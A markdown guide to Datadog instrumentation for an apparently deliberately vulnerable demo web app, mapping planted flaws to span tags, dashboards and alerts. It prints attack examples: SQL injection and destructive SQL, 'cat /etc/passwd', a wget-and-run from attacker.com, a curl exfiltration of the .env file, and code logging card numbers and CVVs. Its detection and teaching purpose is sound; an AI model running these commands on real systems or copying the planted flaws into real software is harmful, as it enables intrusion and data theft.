# Datadog Instrumentation Guide

This document details the comprehensive Datadog instrumentation added to track all vulnerabilities in the Insecure Pizza & Coffee application.

## 🎯 Overview

Every vulnerability in this application is instrumented with Datadog custom span tags to provide detailed visibility into:
- Attack vectors and payloads
- Vulnerability types and severity
- Sensitive data exposure
- User actions and authentication attempts
- System commands and SQL queries

## 📊 Instrumentation Structure

### Standard Tags Applied to All Vulnerabilities

```javascript
span.setTag('vulnerability.type', 'type_name')
span.setTag('vulnerability.category', 'owasp_category')
span.setTag('vulnerability.severity', 'critical|high|medium|low')
span.setTag('http.client_ip', req.ip)
```

## 🔍 Vulnerability-Specific Instrumentation

### 1. SQL Injection

**Locations**: `auth.js`, `orders.js`, `payment.js`, `admin.js`

**Tags Added**:
```javascript
span.setTag('vulnerability.type', 'sql_injection')
span.setTag('vulnerability.category', 'injection')
span.setTag('attack.vector', 'query_parameter|body_parameter')
span.setTag('sql.query', queryString) // Full query with injection
span.setTag('input.category', userInput)
```

**Example Traces**:
- Login: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
- Menu filter: `SELECT * FROM products WHERE category = 'pizza' UNION SELECT...`
- Order placement: Injectable order notes and addresses

**What Datadog ASM Will Show**:
- SQL injection attack patterns detected
- Malicious SQL syntax in traces
- Anomalous query structures
- UNION, OR 1=1, and other attack signatures

---

### 2. Weak Cryptography (MD5)

**Location**: `auth.js`

**Tags Added**:
```javascript
span.setTag('vulnerability.type', 'weak_crypto')
span.setTag('vulnerability.category', 'cryptographic_failure')
span.setTag('crypto.algorithm', 'md5')
span.setTag('crypto.purpose', 'password_hashing')
```

**Details**:
- MD5 is cryptographically broken
- Rainbow table attacks possible
- No salting applied
- Extremely fast to brute force

**What Datadog IAST Will Show**:
- Weak hashing algorithm usage
- Insecure cryptographic practices
- A02:2021 – Cryptographic Failures

**Example**:
```javascript
// Password: admin123
// MD5 Hash: 0192023a7bbd73250516f069df18b500
const md5Password = crypto.createHash('md5').update(password).digest('hex');
```

---

### 3. Command Injection

**Location**: `admin.js` - `/admin/system/execute`

**Tags Added**:
```javascript
span.setTag('vulnerability.type', 'command_injection')
span.setTag('vulnerability.category', 'injection')
span.setTag('vulnerability.severity', 'critical')
span.setTag('attack.vector', 'system_command')
span.setTag('system.command', commandString)
span.setTag('input.validation', 'none')
span.setTag('input.sanitization', 'none')
span.setTag('usr.id', userId)
span.setTag('usr.is_admin', isAdmin)
span.setTag('command.success', true|false)
span.setTag('command.output_length', length)
```

**Attack Examples**:
```bash
# List files
ls -la

# Read sensitive files
cat /etc/passwd

# Network reconnaissance
wget http://attacker.com/payload.sh && bash payload.sh

# Data exfiltration
curl -X POST http://attacker.com/exfil -d "$(cat /app/.env)"
```

**What Datadog Will Show**:
- ASM: Command injection attacks detected
- Workload Security: Suspicious process execution
- APM: Full command payload in traces
- Runtime Security: File access patterns, network connections

---

### 4. Sensitive Data Exposure

**Location**: `payment.js`

**Tags Added**:
```javascript
span.setTag('vulnerability.type', 'sensitive_data_exposure')
span.setTag('vulnerability.category', 'cryptographic_failure')
span.setTag('sensitive.data_type', 'payment_card')
span.setTag('pci.compliance', 'none')
span.setTag('payment.method', method)
span.setTag('payment.card_number', cardNumber) // DANGEROUS!
span.setTag('payment.cvv', cvv) // DANGEROUS!
span.setTag('storage.encryption', 'none')
span.setTag('storage.plaintext_sensitive_data', true)
```

**What's Exposed**:
- Full credit card numbers (in plaintext)
- CVV codes (in plaintext)
- Cardholder names
- PIX keys
- Transaction details

**PCI-DSS Violations**:
- ❌ Storing full PAN (Primary Account Number)
- ❌ Storing CVV/CVC codes
- ❌ No encryption at rest
- ❌ No encryption in transit
- ❌ Logging sensitive data
- ❌ Sending to APM traces

**What Datadog Will Show**:
- ASM: Sensitive data patterns in requests/responses
- IAST: Sensitive data storage violations
- APM: Credit card numbers visible in traces (intentionally!)
- Data Scanner: PII and payment card detection

---

### 5. Arbitrary SQL Execution

**Location**: `admin.js` - `/admin/database/query`

**Tags Added**:
```javascript
span.setTag('vulnerability.type', 'arbitrary_sql_execution')
span.setTag('vulnerability.category', 'injection')
span.setTag('vulnerability.severity', 'critical')
span.setTag('sql.query', userQuery)
span.setTag('sql.validation', 'none')
span.setTag('query.success', true)
span.setTag('query.row_count', count)
```

**Attack Examples**:
```sql
-- Read all user passwords
SELECT username, password FROM users;

-- Drop tables
DROP TABLE users;

-- Access payment data
SELECT * FROM payment_transactions WHERE card_number IS NOT NULL;

-- Update user privileges
UPDATE users SET is_admin = TRUE WHERE username = 'attacker';
```

---

### 6. Authentication Tracking

**Location**: `auth.js`

**Tags Added**:
```javascript
// Success
span.setTag('auth.success', true)
span.setTag('usr.id', userId)
span.setTag('usr.name', username)
span.setTag('usr.is_admin', isAdmin)
span.setTag('session.id', sessionId)

// Failure
span.setTag('auth.failure', 'user_not_found|invalid_password')

// Password Policy
span.setTag('vulnerability.type', 'weak_password_policy')
span.setTag('password.length', length)
span.setTag('input.validation', 'none')
```

---

### 7. Username Enumeration

**Location**: `auth.js` - `/auth/reset-password`

**Tags Added**:
```javascript
span.setTag('vulnerability.type', 'username_enumeration')
span.setTag('vulnerability.category', 'authentication_failure')
span.setTag('enumeration.result', 'user_exists|user_not_found')
span.setTag('vulnerability.type', 'information_disclosure')
```

**Attack Flow**:
1. Attacker tries password reset for various usernames
2. Different responses reveal if username exists
3. Build list of valid usernames
4. Focus brute force attacks on valid accounts

---

### 8. Input Validation Failures

**Location**: Multiple endpoints

**Tags Added**:
```javascript
span.setTag('vulnerability.no_validation', true)
span.setTag('input.product_id', productId)
span.setTag('input.quantity', quantity)
span.setTag('input.sanitization', 'none')
```

---

### 9. Information Disclosure

**Location**: All error handlers

**Tags Added**:
```javascript
span.setTag('error', true)
span.setTag('error.type', errorName)
span.setTag('error.message', errorMessage)
span.setTag('error.stack', stackTrace)
span.setTag('vulnerability.type', 'information_disclosure')
```

**What's Disclosed**:
- Full error messages
- Stack traces
- Database error details
- Internal file paths
- Technology stack information

---

## 📈 Viewing Instrumentation in Datadog

### APM Traces

1. Navigate to **APM → Traces**
2. Filter by service: `insecure-pizza-coffee`
3. View custom tags on each span:
   - Click on any trace
   - Open span details
   - View "Tags" section
   - Look for `vulnerability.*` tags

### Example Trace View

```
Trace: POST /auth/login
├── Span: express.request
│   ├── vulnerability.type: sql_injection
│   ├── vulnerability.category: injection
│   ├── sql.query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
│   ├── attack.vector: sql
│   ├── http.client_ip: 192.168.1.100
│   ├── auth.failure: user_not_found
│   └── crypto.algorithm: md5
```

### Security Signals

1. Navigate to **Security → Application Security → Signals**
2. Filter by: `service:insecure-pizza-coffee`
3. View detected attacks:
   - SQL Injection attempts
   - Command Injection
   - Sensitive data exposure
   - Authentication attacks

### IAST Vulnerabilities

1. Navigate to **Security → Application Vulnerabilities**
2. Filter by service
3. View code-level vulnerabilities:
   - SQL Injection sources
   - Weak cryptography (MD5)
   - Command execution risks
   - Sensitive data storage

### Custom Dashboards

Create dashboards with these queries:

**SQL Injection Attempts**:
```
service:insecure-pizza-coffee vulnerability.type:sql_injection
```

**Command Injection**:
```
service:insecure-pizza-coffee vulnerability.type:command_injection
```

**Sensitive Data Exposure**:
```
service:insecure-pizza-coffee sensitive.data_type:payment_card
```

**Failed Authentication**:
```
service:insecure-pizza-coffee auth.failure:*
```

**Weak Cryptography**:
```
service:insecure-pizza-coffee crypto.algorithm:md5
```

---

## 🔧 Custom Metrics

You can create custom metrics from these tags:

```
# Count SQL injection attempts
count(vulnerability.type:sql_injection) by {attack.vector}

# Track command injection by user
count(vulnerability.type:command_injection) by {usr.id}

# Monitor sensitive data access
count(sensitive.data_type:payment_card) by {http.client_ip}

# Failed auth attempts
count(auth.failure:*) by {usr.name}
```

---

## 🎯 Testing the Instrumentation

### 1. Generate SQL Injection Attack

```bash
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1&password=anything"
```

**Expected in Datadog**:
- APM trace with `vulnerability.type:sql_injection`
- ASM security signal for SQL injection
- Full query visible in span tags

### 2. Test Command Injection

1. Login as admin
2. Navigate to `/admin/dashboard`
3. Execute: `whoami; cat /etc/passwd`

**Expected in Datadog**:
- APM trace with `vulnerability.type:command_injection`
- Workload Security alert for suspicious command
- Full command in span tags
- Command output length tracked

### 3. Test Sensitive Data Exposure

1. Place an order with fake credit card
2. Check payment with card number

**Expected in Datadog**:
- APM trace with `sensitive.data_type:payment_card`
- Credit card number visible in tags (!!!)
- PCI compliance flag: `none`
- Data Scanner alerts

### 4. Test Weak Crypto

1. Register new user with password
2. Check login with same password

**Expected in Datadog**:
- IAST vulnerability: MD5 usage detected
- APM traces with `crypto.algorithm:md5`
- Cryptographic failure category

---

## 🚨 Alert Examples

### Critical: Command Injection Detected

```
Alert when:
  vulnerability.type:command_injection
Notify: Security team
Priority: P1
```

### High: SQL Injection Attempts

```
Alert when:
  vulnerability.type:sql_injection
  AND count > 5 in 5 minutes
Notify: Security team
Priority: P2
```

### High: Sensitive Data Accessed

```
Alert when:
  sensitive.data_type:payment_card
  AND usr.is_admin:false
Notify: Compliance team
Priority: P1
```

### Medium: Weak Crypto Usage

```
Alert when:
  crypto.algorithm:md5
  OR crypto.algorithm:sha1
Notify: Engineering team
Priority: P3
```

---

## 📚 Best Practices for Production

**⚠️ WARNING**: These instrumentation patterns are for VULNERABLE test applications only!

**Never in production**:
- ❌ Don't log sensitive data (credit cards, passwords)
- ❌ Don't send PII to APM
- ❌ Don't expose error details to users
- ❌ Don't track passwords or CVVs

**Do in production**:
- ✅ Track authentication events (without credentials)
- ✅ Monitor SQL query patterns (sanitized)
- ✅ Log security events
- ✅ Track error rates (without details)
- ✅ Use Datadog's automatic security detection

---

## 🔗 Additional Resources

- [Datadog APM Custom Tags](https://docs.datadoghq.com/tracing/trace_collection/custom_instrumentation/)
- [Datadog ASM](https://docs.datadoghq.com/security/application_security/)
- [Datadog IAST](https://docs.datadoghq.com/security/application_security/iast/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

**Last Updated**: 2025-11-19
